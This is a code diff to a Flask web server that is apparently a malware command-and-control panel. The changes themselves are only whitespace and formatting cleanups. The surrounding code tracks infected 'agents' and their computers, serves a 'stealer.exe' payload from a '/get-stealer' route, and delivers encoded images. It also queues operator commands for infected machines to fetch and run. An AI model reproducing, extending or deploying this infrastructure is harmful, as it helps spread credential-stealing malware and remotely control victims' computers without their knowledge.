@@ -37,7 +37,6 @@ app.config["CLIENT_ENCODED_IMAGES"] = "/media/sf_c2/encImages/"
 app.config["CLIENT_STEALER"] = "/media/sf_c2/stealer/"
 
 
-
 login_manager = flask_login.LoginManager()
 login_manager.init_app(app)
 
@@ -83,7 +82,6 @@ class Agents(db.Model):
     computer = db.Column(db.String(256))
 
 # db.create_all()
-
 
 
 def getUserList():
@@ -161,9 +159,8 @@ def register():
         return render_template('redir.html')
 
 
-
 @app.route("/get-image/<image_name>", methods=['GET', 'POST'])
-def get_image(image_name):          
+def get_image(image_name):
     try:
         return send_from_directory(app.config["CLIENT_ENCODED_IMAGES"], path=image_name, as_attachment=True)
     except FileNotFoundError:
@@ -171,7 +168,7 @@ def get_image(image_name):
 
 
 @app.route("/get-stealer", methods=['GET', 'POST'])
-def get_stealer():          
+def get_stealer():
     try:
         return send_from_directory(app.config["CLIENT_STEALER"], path="stealer.exe", as_attachment=True)
     except FileNotFoundError:
@@ -201,8 +198,6 @@ def getCommand():
                 db.session.commit()
                 print("Result data committed to the db!")
 
-            # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE
-            
             # Check if someone is trying to exploit our server
             try:
                 checker = int(imageNum)
@@ -235,7 +230,7 @@ def create():
     if request.form['task_3'] != None:
         cmd3 = request.form['task_3']
 
-    new_cmds = Commands(cmds=cmd +" "+ cmd2 +" "+ cmd3, done=False)
+    new_cmds = Commands(cmds=cmd + " " + cmd2 + " " + cmd3, done=False)
     db.session.add(new_cmds)
     db.session.commit()
 
